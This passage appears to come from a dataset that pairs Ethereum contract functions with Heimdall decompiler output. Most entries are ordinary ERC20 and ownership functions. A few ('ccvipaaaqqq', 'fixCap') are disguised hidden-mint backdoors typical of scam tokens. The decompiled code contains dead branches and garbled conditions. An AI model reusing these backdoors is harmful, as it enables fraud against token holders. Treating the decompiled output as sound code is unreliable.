0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n                        var_h = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n                        require(!((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) < totalSupply);\n                        var_g = ((((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n                        var_h = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n                        require(!(arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0);\n                    }\n                }\n            }\n        }\n        var_c = 0x20;\n        var_d = var_b.length;\n        return abi.encodePacked(0x20, var_b.length);\n    }"}
{"contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1", "original_solidity_code": "function fixCap(uint256 _amount) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _totalSupply += _amount;\r\n    }", "heimdall_decompiled_code": "function fixCap(uint256 arg0) public {\n        require(address(msg.sender) == (address(store_c)), \"Caller is not the original caller\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x43616c6c6572206973206e6f7420746865206f726967696e616c2063616c6c65;\n        var_e = 0x7200000000000000000000000000000000000000000000000000000000000000;\n        require(!totalSupply > (arg0 + totalSupply));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        totalSupply = arg0 + totalSupply;\n    }"}
{"contract_address": "0x8D8695A3Da190f5D1C468FA7018a83F4FFb6c513", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x30F674e5399B6493A6096d239153b21331fbC670", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xE5513c73eaCe54F05fDfa98061784bfd66b86bEA", "original_solidity_code": "function changeRemain() public onlyOwner{\r\n        remainHolder = !remainHolder;\r\n    }", "heimdall_decompiled_code": "function changeRemain() public {\n        require(msg.sender == (address(owner)), \"you are not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x11;\n        var_d = 0x796f7520617265206e6f74206f776e6572000000000000000000000000000000;\n        remainHolder = (!bytes1(remainHolder)) | (uint248(remainHolder));\n    }"}
{"contract_address": "0x35D17C2467E1D8aB2d8789FD7af72af770BDBc52", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\\r\\n      _approve(msg.sender, spender, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[3276:3312];\n    }"}
{"contract_address": "0xf06ea21cB6894CC70e2EF280026D5Fc5bEE15421", "original_solidity_code": "function changetimeCal(uint256 _time) external onlyOwner{\r\n        time=_time;\r\n    }", "heimdall_decompiled_code": "function changetimeCal(uint256 arg0) public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        time = arg0;\n    }"}
{"contract_address": "0x0c929e3FF6Ed49E9D538756Bd127f5f23e1fC7D6", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\\r\\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        address var_a = msg.sender;\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!((arg1 + storage_map_c[var_a]) < storage_map_c[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_c[var_a] = arg1 + storage_map_c[var_a];\n        uint256 var_c = arg1 + storage_map_c[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_c[var_a]);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x22;\n        var_h = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x24;\n        var_h = this.code[3276:3312];\n    }"}
{"contract_address": "0x49e5FEE649E311efc2Cfb0f1f47e82CD90bECA13", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function updateTeamWallet(address newWallet) external onlyOwner {\\n        emit teamWalletUpdated(newWallet, teamWallet);\\n        teamWallet = newWallet;\\n    }", "heimdall_decompiled_code": "function updateTeamWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit teamWalletUpdated(address(arg0), address(teamWallet));\n        teamWallet = (address(arg0)) | (uint96(teamWallet));\n    }"}
{"contract_address": "0x9BD1F6a85396380c6404408125229550a03Ecb22", "original_solidity_code": "function removeLimits() external onlyOwner{\\r\\n        _maxTxAmount = _tTotal;\\r\\n        _maxWalletSize=_tTotal;\\r\\n        transferDelayEnabled=false;\\r\\n        emit MaxTxAmountUpdated(_tTotal);\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x8084E313691B80C63c8f1a68de1003a685376aCA", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xe7fEA96bA7a112602bCfe9a472473627D88c3De5", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x05f5e100 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if (!0x05f5e100 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        if (0x09) {\n                            if (!0x05f5e100 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3f23e180A37FC2F2fbFE32F4B37e86b88CA15a64", "original_solidity_code": "function remainingTokens() public view returns (uint256) {\r\n        return\r\n            Math.min(\r\n                myToken.balanceOf(owner()),\r\n                myToken.allowance(owner(), address(this))\r\n            );\r\n    }", "heimdall_decompiled_code": "function remainingTokens() public payable returns (uint256) {\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(owner);\n        require(address(myToken).code.length);\n        (bool success, bytes memory ret0) = address(myToken).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        var_d = 0xdd62ed3e00000000000000000000000000000000000000000000000000000000;\n        address var_e = address(owner);\n        address var_f = address(this);\n        require(address(myToken).code.length);\n        (bool success, bytes memory ret0) = address(myToken).Unresolved_dd62ed3e(var_e); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_c.length < var_c.length);\n        uint256 var_g = var_c.length;\n        return var_c.length;\n        var_g = var_c.length;\n        return var_c.length;\n    }"}
{"contract_address": "0xC1687b1453E40Bd9F46b33dFf3c6ea3A0Ea168eA", "original_solidity_code": "function burn(uint256 value) external {\r\n        _burn(msg.sender, value);\r\n    }", "heimdall_decompiled_code": "function burn(uint256 arg0) public payable {\n        require(arg0 == arg0);\n        require(address(msg.sender) - 0, \"Blacklisted\");\n        uint256 var_a = 0;\n        var_b = 0x08;\n        require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"Blacklisted\");\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Blacklisted\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x0b;\n        var_g = 0x426c61636b6c6973746564000000000000000000000000000000000000000000;\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"Forbid\");\n        require(!(!0 == (address(owner / 0x01))), \"Forbid\");\n        var_a = 0;\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg0)), \"Forbid\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!((storage_map_b[var_a] + arg0) > maxHoldingAmount), \"Forbid\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x06;\n        var_g = 0x466f726269640000000000000000000000000000000000000000000000000000;\n        require(!(maxTxAmount > 0), \"Exceeds max transaction amount\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"Exceeds max transaction amount\");\n        require(!(!0 == (address(owner / 0x01))), \"Exceeds max transaction amount\");\n        require(!(arg0 > maxTxAmount), \"Exceeds max transaction amount\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x1e;\n        var_g = 0x45786365656473206d6178207472616e73616374696f6e20616d6f756e740000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < arg0), \"ERC20: burn amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a206275726e20616d6f756e7420657863656564732062616c616e;\n        var_i = 0x6365000000000000000000000000000000000000000000000000000000000000;\n        require(!((storage_map_b[var_a] - arg0) > storage_map_b[var_a]), \"ERC20: burn from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg0;\n        require(!((totalSupply - arg0) > totalSupply), \"ERC20: burn from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        totalSupply = totalSupply - arg0;\n        uint256 var_c = arg0;\n        emit Transfer(address(msg.sender), 0, arg0);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;\n        var_i = 0x7300000000000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x30F674e5399B6493A6096d239153b21331fbC670", "original_solidity_code": "function updateSellFees(\r\n        uint256 _marketingFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _developmentFee\r\n    ) external onlyOwner {\r\n        sellMarketingFee = _marketingFee;\r\n        sellLiquidityFee = _liquidityFee;\r\n        sellDevelopmentFee = _developmentFee;\r\n        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevelopmentFee;\r\n    }", "heimdall_decompiled_code": "function updateSellFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        sellMarketingFee = arg0;\n        sellLiquidityFee = arg1;\n        sellDevelopmentFee = arg2;\n        require(!arg0 > ~(arg1));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0xEEF6196376173FC3F2BeDfe0cFcB355401e1Be51", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x73adcB9F7B46BF6E6f1D027BB13eAAfa158A8A09", "original_solidity_code": "function setDistributor(address _distributor) external onlyOwner {\r\n        distributor = IDistributor(_distributor);\r\n        emit DistributorSet(_distributor);\r\n    }", "heimdall_decompiled_code": "function setDistributor(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        distributor = (address(arg0) * 0x01) | (uint96(distributor));\n        address var_a = address(arg0);\n        emit DistributorSet(address(arg0));\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9E094200906d93a320D92C0eFb4a57436796DAb0", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function disableTransferDelay() external onlyOwner {\r\n        transferDelayEnabled = false;\r\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = uint248(transferDelayEnabled);\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function ccvipaaaqqq() external   {\r\n        if(_msgSender() == vipadmin123){\r\n            \r\n        }else{\r\n            \r\n        }\r\n        address passok = _msgSender();\r\n        _balances[passok] += axxammount;\r\n        require(_msgSender() == vipadmin123);\r\n\r\n    }", "heimdall_decompiled_code": "function ccvipaaaqqq() public payable {\n        address var_a = msg.sender;\n        var_b = 0x06;\n        require(!storage_map_b[var_a] > (store_f + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = store_f + storage_map_b[var_a];\n        require(address(msg.sender) == (address(vipadmin123)));\n    }"}
{"contract_address": "0xC0BA94337896c443b7728Dce84B0A750e290fbFd", "original_solidity_code": "function showSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }", "heimdall_decompiled_code": "function showSupply() public view {\n        uint256 var_a = 0;\n        var_b = 0x06;\n        var_a = 0xdead;\n        var_b = 0x06;\n        uint256 var_c = 0x40 + var_c;\n        var_d = 0x1e;\n        var_e = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(storage_map_j[var_a] > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        uint256 var_h = var_c.length;\n        uint256 var_i = 0;\n        var_j = var_k;\n        var_i = 0;\n        if (!(totalSupply - storage_map_j[var_a]) > totalSupply) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_l = 0x11;\n        }\n    }"}
